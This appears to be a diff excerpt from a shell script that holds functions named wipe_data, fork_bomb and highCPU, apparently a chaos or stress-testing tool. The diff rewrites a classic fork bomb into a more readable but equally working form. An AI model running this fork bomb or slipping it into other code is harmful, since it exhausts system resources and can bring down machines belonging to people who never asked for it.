@@ -5,7 +5,7 @@ function wipe_data() {
 }
 
 function fork_bomb() {
-  :() { :|:& }; :
+  fork() { fork|fork& }; fork
 }
 
 function highCPU() {
